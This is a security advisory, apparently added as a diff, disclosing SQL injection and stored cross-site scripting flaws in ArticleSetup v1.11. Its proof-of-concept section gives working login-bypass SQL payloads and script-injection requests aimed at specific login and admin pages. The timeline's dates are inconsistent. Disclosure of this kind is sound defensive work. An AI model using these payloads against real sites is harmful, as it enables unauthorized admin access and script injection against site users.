@@ -1,0 +1,204 @@
+##############################################################################
+#
+# Title    : ArticleSetup Multiple Persistence Cross-Site Scripting and SQL
+             Injection Vulnerabilities
+# Author   : Antu Sanadi SecPod Technologies (www.secpod.com)
+# Vendor   : http://www.articlesetup.com/
+# Advisory : http://secpod.org/blog/?p=497
+#            http://secpod.org/advisories/SecPod_ArticleSetup_Multiple_Vuln.txt
+# Software : ArticleSetup v1.11 and prior.
+# Date     : 30/03/2012
+#
+###############################################################################
+
+SecPod ID: 1037                                 23/08/2011 Issue Discovered
+                                                21/02/2012 Vendor Notified
+                                                No Response from vendor
+                                                30/03/2011 Advisory Released
+
+Class: XSS/SQL Injection                        Severity: High
+
+
+Overview:
+---------
+ArticleSetup Multiple Persistence Cross-Site Scripting and SQL Injection
+Vulnerabilities.
+
+
+Technical Description:
+----------------------
+ArticleSetup Multiple Persistence Cross-Site Scripting and SQL Injection
+Vulnerabilities.
+
+  i) Input passed via the 'userid' and 'password' parameter in
+     '/upload/login.php' page is not properly verified before being used in
+     an SQL query. This can be exploited to manipulate SQL queries by injecting
+     arbitrary SQL queries.
+
+ ii) Input passed via the 'userid' and 'password' parameter in
+     '/upload/admin/login.php' page is not properly verified before being
+     used in an SQL query. This can be exploited to manipulate SQL queries
+     by injecting arbitrary SQL queries.
+
+iii) Input passed via the 'cat' parameter in 'upload/feed.php' page is not
+     properly verified before being used in an SQL query. This can be
+     exploited to manipulate SQL queries by injecting arbitrary SQL queries.
+
+ iV) Input passed via the 's' parameter in 'upload/search.php' page is not
+     properly verified before being used in an SQL query. This can be
+     exploited to manipulate SQL queries by injecting arbitrary SQL queries.
+
+ V)  Input passed via the 'id' parameter in '/upload/admin/pageedit.php',
+     'upload/admin/authoredit.php' and '/admin/categoryedit.php?id' pages are
+     not properly verified before being used in an SQL query. This can be
+     exploited to manipulate SQL queries by injecting arbitrary SQL queries.
+
+Vi)  Input passed via the 's' and parameter in '/upload/search.php' page is not
+     properly verified before it is returned to the user. This can be exploited
+     to execute arbitrary HTML and script code in a user's browser session in
+     the context of a vulnerable site.
+
+Vii) Input passed via the 'title' and parameter in 'upload//author/submit.php'
+     page is not properly verified before it is returned to the user. This can
+     be exploited to execute arbitrary HTML and script code in a user's browser
+     session in the context of a vulnerable site.
+
+Viii)Input passed via the 'title' and parameter in '/upload/admin/articlenew.php',
+     '/upload/admin/categories.php' and '/upload/admin/pages.php' pages are not
+     properly verified before it is returned to the user. This can be exploited
+     to execute arbitrary HTML and script code in a user's browser session in
+     the context of a vulnerable site.
+
+  The vulnerabilities are tested in ArticleSetup v1.10 Other versions  may also
+  be affected.
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to execute arbitrary HTML
+code in a user's browser session in the context of a vulnerable application
+or to manipulate SQL queries by injecting arbitrary SQL code.
+
+
+Affected Software:
+------------------
+ArticleSetup v1.11 and prior.
+
+Tested on,
+ArticleSetup v1.10, v1.11
+
+
+References:
+-----------
+http://www.articlesetup.com/
+http://secpod.org/blog/?p=497
+http://secpod.org/advisories/SecPod_ArticleSetup_Multiple_Vuln.txt
+
+
+Proof of Concept:
+-----------------
+
+POC 1:
+-----
+SQL Injection Vulnerabilities.
+
+http://IP_ADDR/ArticleSetup/upload//feed.php?cat='
+http://IP_ADDR/ArticleSetup/upload/search.php?s=%27
+http://IP_ADDR/ArticleSetup/upload/admin/pageedit.php?id=%27
+http://IP_ADDR/ArticleSetup/upload/admin/authoredit.php?id=%27
+http://IP_ADDR/ArticleSetup/upload//admin/categoryedit.php?id=%27
+
+POST /ArticleSetup/upload/login.php
+Host: IP_ADDR
+User-Agent:  SQL INJECTION TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+
+Post Data:
+==========
+userid=%27+or+%27bug%27%3D%27bug%27+%23&password=%27+or+%27bug%27%3D%27bug%27+%23
+
+POST /ArticleSetup//upload/login.php
+Host: IP_ADDR
+User-Agent:  SQL INJECTION TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+
+Post Data:
+==========
+userid=%27+or+%27bug%27%3D%27bug%27+%23&password=%27+or+%27bug%27%3D%27bug%27+%23
+
+POC 2:
+-----
+Cross Site Scripting Vulnerabilities.
+
+http://IP_ADDR/ArticleSetup/upload//search.php?s=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E
+
+POST /ArticleSetup//upload/author/submit.php HTTP/1.1
+Host: IP_ADDR
+User-Agent: STORED XSS TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 202
+
+Post Data:
+==========
+title=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E&category=1&body=%3Cp%3Eantu+sanadi+barn+in+india%3C%2Fp%3E&resource=%3Cp%3Eindia+is+gereat%3C%2Fp%3E&save=Submit+Article+%C2%BB&update=
+
+POST /ArticleSetup//upload/admin/articlenew.php
+Host: IP_ADDR
+User-Agent: STORED XSS TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 163
+
+Post Data:
+==========
+title=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E&category=38&body=%3Cp%3Ei+am+here%3C%2Fp%3E&resource=%3Cp%3Ewhere+are+you%3C%2Fp%3E&save=&submit=
+
+POST /ArticleSetup//upload/admin/categories.php
+Host: IP_ADDR
+User-Agent: STORED XSS TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+
+Post Data:
+==========
+title=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E&parentid=NULL&add=&save=
+
+
+POST /ArticleSetup/upload/admin/pages.php
+Host: IP_ADDR
+User-Agent:  STORED XSS TEST
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+
+Post Data:
+==========
+title=%3Cscript%3Ealert%28%22SecPod-XSS-TEST%22%29%3C%2Fscript%3E&body=%3Cp%3Edsfds%3C%2Fp%3E&onmenu=on&add=&save=
+
+
+Solution:
+----------
+Fix not available
+
+
+Risk Factor:
+-------------
+     CVSS Score Report:
+        ACCESS_VECTOR          = NETWORK
+        ACCESS_COMPLEXITY      = LOW
+        AUTHENTICATION         = NONE
+        CONFIDENTIALITY_IMPACT = PARTIAL
+        INTEGRITY_IMPACT       = PARTIAL
+        AVAILABILITY_IMPACT    = NONE
+        EXPLOITABILITY         = PROOF_OF_CONCEPT
+        REMEDIATION_LEVEL      = UNAVAILABLE
+        REPORT_CONFIDENCE      = CONFIRMED
+        CVSS Base Score        = 6.4 (AV:N/AC:L/Au:N/C:P/I:P/A:N)
+        Risk factor            = High 
+
+
+Credits:
+--------
+Antu Sanadi of SecPod Technologies has been credited with the discovery of this
+vulnerability.
+
